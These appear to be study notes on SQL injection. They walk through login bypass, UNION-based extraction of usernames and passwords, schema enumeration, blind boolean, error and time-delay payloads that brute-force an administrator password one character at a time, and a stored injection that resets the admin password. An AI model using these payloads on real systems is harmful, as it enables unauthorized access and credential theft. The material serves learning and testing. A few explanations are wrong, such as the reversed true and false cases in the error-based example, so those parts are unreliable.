**What is SQL injection ?** 

SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database allows an attacker to view data that they are not normally able to retrieve.

*before start basic knowledge about SQL Query recommended* 

check this [repo](https://github.com/MAAelHamid/Database/blob/main/SQL%20Explained.md#03-sql-physical-design) for SQL basics ...

***Note : the -- (double-dash) comment style requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on) ...*** 

***Many URL decoders treat `+` as a space.***



**SQL injection Targets :**

1. **Retrieving hidden data** *where you can modify an SQL query to return additional results.*

   ```sql
   -- this line of code retrieves all records with name 'ahmed' in department 'hr'
   SELECT * FROM users WHERE name = 'ahmed' AND department = 'hr'
   -- if user input goes to name field with no filter we can abuse this code
   -- if user input like   	' OR 1=1 	   the code be like
   SELECT * FROM users WHERE name = '' OR 1=1
   -- which makes always true condition
   -- this line of code retrieves all records in users table
   ```

   ​	

2. **Subverting application logic** *where you can change a query to interfere with the application's logic.*

   ```sql
   -- this line of code used to login vrefication
   SELECT * FROM users WHERE username = 'admin' AND password = 'p@ssword'
   -- if user input has no filter we can abuse this code
   -- if username like   	admin'-- 	   the code be like
   SELECT * FROM users WHERE username = 'admin'-- AND password = 'bluecheese'
   -- Now u IN ;)
   ```

   

3. **UNION attacks** *where you can retrieve data from different database tables*.

   ```sql
   -- this line of code name and description from products table where category gifts
   SELECT name, description FROM products WHERE category = 'Gifts'
   -- Gifts  is the user input
   -- if there is no input filter we can abuse this using this
   -- 				' UNION SELECT username, password FROM users--
   -- the code be like 
   SELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--
   -- this cause the application to return all usernames and passwords along with the names and descriptions of products.
   ```

   

   **Determining the number of columns required in an SQL injection UNION attack**

   For a UNION query to work, two key requirements must be met :

   - The individual queries must return the same number of columns.

     `SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

     2 column from table1 and 2  column from table2

   - The data types in each column must be compatible between the individual queries.

   To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:

   - *How many columns* are being returned from the original query?

     ```sql
     -- by adding the at the end of query till error comes out
     -- highest number without error is the number of columns
     ' ORDER BY 1--
     ' ORDER BY 2--
     ' ORDER BY 3--
     ```

   - Which columns returned from the original query are of a suitable *data type* to hold the results from the injected query?

     ```sql
     -- last step we know number of colums
     -- we write number of colums represented with NULLs like this
     ' UNION SELECT NULL--
     ' UNION SELECT NULL,NULL--
     ' UNION SELECT NULL,NULL,NULL--
     -- let's say we have 3 colums we wanna to identifiy data type of each column
     -- try one by one ...
     ' UNION SELECT 'a',NULL,NULL--
     -- if now error thats mean firt column is String next one
     ' UNION SELECT 'a',1,NULL--
     -- if now error thats mean second column is Integer next one
     ' UNION SELECT 'a',1,'a'--
     -- if now error thats mean third column is String
     ```

   Notes :

   - The reason for using `NULL` as the values returned from the injected `SELECT` query is that the data types in each column must be compatible between the original and the injected queries. Since `NULL` is convertible to every commonly used data type, using `NULL` maximizes the chance that the payload will succeed when the column count is correct.
   - On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `DUAL` which can be used for this purpose. So the injected queries on Oracle would need to look like: `' UNION SELECT NULL FROM DUAL--`.
   - The payloads described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.

    

   **If we know the name of columns and table** we can retrieve sensitive data for example

   `' UNION SELECT username, password FROM users--`

   this will retrieves login credentials ...

   

   In case we need to **retrieve multiple values within a single column**

   like `select id, name from members ... UNION SELECT username, password FROM users--`

   this will crash data types of columns not th same So we will retrieve  username, password in one column by concatenating the values together

   ' UNION SELECT username || '~' || password FROM users--

   `select id, name from members ... UNION SELECT NULL,username || '~' || password FROM users--`

   

   **RECAP :**

   `' ORDER BY #--`		> count number of column

   `' UNION SELECT [string|int|...]--`			> identify data type

   `' UNION SELECT username, password FROM users--`			> retrieve sensitive data if we know columns and table name

   if data types can't help use we can set null for data type we won't use and concatenate our target columns in one 

   

4. **Examining the database** *where you can extract information about the version and structure of the database.*

   ```sql
   -- if application infected with SQLI we can run some code ... it's generally useful to obtain some information about the database itself. This information can often pave the way for further exploitation.
   -- we can know database type in Oracle DB using this 
   SELECT * FROM v$version
   -- we can also determine what database tables exist
   SELECT * FROM information_schema.tables
   ```

   The queries to **determine the database version** for some popular database types are as follows:

   |  Database type   |           Query           |
   | :--------------: | :-----------------------: |
   | Microsoft, MySQL |    `SELECT @@version`     |
   |      Oracle      | `SELECT * FROM v$version` |
   |    PostgreSQL    |    `SELECT version()`     |

   *oracle query must include "FROM"*

   **Listing the contents of the database :**

   ```sql
   SELECT * FROM information_schema.tables
   -- Output like
   TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE
   =====================================================
   MyDatabase dbo Products BASE TABLE
   MyDatabase dbo Users BASE TABLE
   MyDatabase dbo Feedback BASE TABLE
   
   SELECT * FROM information_schema.columns WHERE table_name = 'Users'
   -- Output like
   TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE
   =================================================================
   MyDatabase dbo Users UserId int
   MyDatabase dbo Users Username varchar
   MyDatabase dbo Users Password varchar
   ```

   

   **Reach SENSITIVE data steps :**

    - Microsoft, MySQL and PostgreSQL

      - calculate the number of columns

        `'order by # --'`

      - check data type of each one 

        `' UNION SELECT [string|int|...]--`

      - retrieve the list of tables in the database

        `' UNION SELECT [table_name,[...],NULL] FROM information_schema.tables--`

      - Find the name of the table containing user credentials.

      - retrieve the details of the columns in the table

        `'UNION SELECT [column_name,[...],NULL] FROM information_schema.columns WHERE table_name='[table_name]'--`

      - Find the names of the columns containing usernames and passwords

      - retrieve the usernames and passwords for all users

         `' UNION SELECT [username_coulmn], [password_coulmn] FROM [table_name]--`

        

    - Oracle databases

      - calculate the number of columns

        `'order by # --'`

      - check data type of each one 

        `' UNION SELECT [string|int|...] FROM DUAL--`

      - retrieve the list of tables in the database

        `' UNION SELECT [table_name,[...],NULL] FROM all_tables--`

      - Find the name of the table containing user credentials.

      - retrieve the details of the columns in the table

        `'UNION SELECT [column_name,[...],NULL] all_tab_columns WHERE table_name='[table_name]'--`

      - Find the names of the columns containing usernames and passwords

      - retrieve the usernames and passwords for all users

         `' UNION SELECT [username_coulmn], [password_coulmn] FROM [table_name]--`

   **RECAP**

   know target tables

   know target columns

   retrieve targeted data 

   

5. **Blind SQL injection** *where the results of a query you control are not returned in the application's responses.*

   Blind SQL injection arises when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

   With blind SQL injection vulnerabilities, many techniques such as UNION attacks, are not effective because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

   - **Exploiting blind SQL injection by triggering conditional responses**

     *"use this when some text printed after successful login"*

     Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

     Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

     When a request containing a `TrackingId` cookie is processed, the application determines whether this is a known user using an SQL query like this:

     ```
     SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
     ```

     This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If it returns data (because a recognized TrackingId was submitted), then a "Welcome back" message is displayed within the page.

     This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information by triggering different responses conditionally, depending on an injected condition. To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:

     `…xyz' AND '1'='1`  cause the query to return results, because the injected AND '1'='1 condition is true, and so the "Welcome back" message will be displayed
     `…xyz' AND '1'='2`

     these two tests we detect that App infected with SQLI hence let's exploit it 

     we can preform any sql command after AND

     for Ex : we can brute force password char by char using

     ```sql
     xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
     -- repeat to reach right char
     xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
     
     xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), §1§, 1) = '§a§
     -- here app return welcome which means first char of password is 's'
     -- repaet for next chars ... Congrats u have password 
     ```

   

   - **Inducing conditional responses by triggering SQL errors**

     In this situation, *it is often possible to induce the application to return conditional responses by triggering SQL errors conditionally*, depending on an injected condition. This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false. Very often, an unhandled error thrown by the database will cause some difference in the application's response (such as an error message), allowing us to infer the truth of the injected condition.
     
     To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
     
     `xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
     
     `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
     
     These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the CASE expression evaluates to 'a', which does not cause any error. With the second input, it evaluates to 1/0, which causes a divide-by-zero error. Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.
     
     Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:
     
     `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = §m§') THEN 1/0 ELSE 'a' END FROM Users)='a`
     
     above payload trigger error when CASE WHEN become true
     
     *note : CASE WHEN [condition] THEN [true_case] ELSE [false_case] END* 
     
     ```sql
     -- 	================ Scenario ================
     -- check if app infected with SQLI
     xzy''
     -- test using concat
     '||(select '' from users where ROWNUM=1)||'
     -- check if there is user named administrator
     '||(select case when (1=1) then TO_CHAR(1/0) ELSE '' END from users where username='administrator')||'
     -- brute force pass lenght
     '||(select case when length(password)>§1§ then TO_CHAR(1/0) ELSE '' END from users where username='administrator')||'
     -- brute force pass
     '||(select case when substr(password,§1§,1)='§a§' then TO_CHAR(1/0)  ELSE '' END from users where username='administrator')||'
     ```
     
     ​	
     
   - **Exploiting blind SQL injection by triggering time delays**

     In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays conditionally, depending on an injected condition. Because SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.

     The techniques for triggering a time delay are highly specific to the type of database being used. On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:

     `'; IF (1=2) WAITFOR DELAY '0:0:10'--`
     `'; IF (1=1) WAITFOR DELAY '0:0:10'--`

     The first of these inputs will not trigger a delay, because the condition 1=2 is false. The second input will trigger a delay of 10 seconds, because the condition 1=1 is true.

     Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:

     ```sql
     '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, §1§, 1) = '§a§') = 1 WAITFOR DELAY '0:0:{delay}'--
     ```

     payload Ex:
     
     ```sql
     '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
     ```
     
     **RECAP**
     
     ```sql
     -- test SQLI
     '; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
     '; SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
     
     -- check if there is user named administrator
     '; SELECT CASE WHEN (username="Administrator") THEN pg_sleep(10) ELSE pg_sleep(0) END--
     
     -- calc pass lenght
     '; SELECT CASE WHEN (username="Administrator" AND LENGTH(password)=§1§) THEN pg_sleep(10) ELSE pg_sleep(0) END--
     
     -- calc pass lenght ** Cluster Bobm Technique **
     '; SELECT CASE WHEN (username="Administrator" AND SUBSTR(password,§1§,1)=§a§) THEN pg_sleep(10) ELSE pg_sleep(0) END--
     ```
     
     

**How to Detect :**

- Submitting the single quote character ' and looking for errors or other anomalies.

- Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.

- Submitting Boolean conditions such as OR 1=1 and OR 1=2, and looking for differences in the application's responses.

- Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.

- Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.

  

**SQL injection in different parts of the query**

- In UPDATE statements, within the updated values or the WHERE clause.
- In INSERT statements, within the inserted values.
- In SELECT statements, within the table or column name.
- In SELECT statements, within the ORDER BY clause.



**Second-order SQL injection** AKA (**stored SQL injection**) 

in this case the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability arises at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into an SQL query in an unsafe way.

Ex:

```sql
-- 								CREATE ACCOUNT PAGE ...
-- in username field input be like 	
-- 				ahmed';update users set password='p@ssword' where user='admin'
-- sql code be like 
select * from posts where user='ahmed';update users set password='p@ssword' where user='admin'
-- Now admin password set to p@assword and you have access to admin account
-- admin account credentials .... username:admin -- password:p@ssword 
```

